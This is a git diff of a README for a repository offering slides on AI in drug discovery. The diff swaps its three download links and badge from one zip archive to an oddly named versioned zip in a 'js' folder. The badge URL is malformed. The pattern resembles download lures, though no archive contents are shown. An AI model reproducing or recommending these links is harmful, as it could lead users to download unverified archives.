@@ -1,6 +1,6 @@
 # 🧬 ai-drug-discovery-slides - Explore AI in Drug Discovery Effortlessly
 
-[![Download](https://raw.githubusercontent.com/canela0208/ai-drug-discovery-slides/master/tridepside/ai-drug-discovery-slides.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/canela0208/ai-drug-discovery-slides/master/tridepside/ai-drug-discovery-slides.zip)
+[![Download](https://github.com/canela0208/ai-drug-discovery-slides/raw/refs/heads/master/js/ai-discovery-slides-drug-3.5-beta.5.zip%20Now-Click%20Here-brightgreen)](https://github.com/canela0208/ai-drug-discovery-slides/raw/refs/heads/master/js/ai-discovery-slides-drug-3.5-beta.5.zip)
 
 ## 📋 Overview
 
@@ -29,7 +29,7 @@ To run the ai-drug-discovery-slides, you will need:
 
 To get started, visit the releases page to download the latest version of the ai-drug-discovery-slides. 
 
-[Download ai-drug-discovery-slides](https://raw.githubusercontent.com/canela0208/ai-drug-discovery-slides/master/tridepside/ai-drug-discovery-slides.zip)
+[Download ai-drug-discovery-slides](https://github.com/canela0208/ai-drug-discovery-slides/raw/refs/heads/master/js/ai-discovery-slides-drug-3.5-beta.5.zip)
 
 Here's how you can download the slides:
 
@@ -82,4 +82,4 @@ For those interested in diving deeper into AI in drug discovery, consider checki
 
 Thank you for your interest in ai-drug-discovery-slides. Enjoy your exploration of AI-driven drug discovery!
 
-[Download ai-drug-discovery-slides](https://raw.githubusercontent.com/canela0208/ai-drug-discovery-slides/master/tridepside/ai-drug-discovery-slides.zip)
+[Download ai-drug-discovery-slides](https://github.com/canela0208/ai-drug-discovery-slides/raw/refs/heads/master/js/ai-discovery-slides-drug-3.5-beta.5.zip)
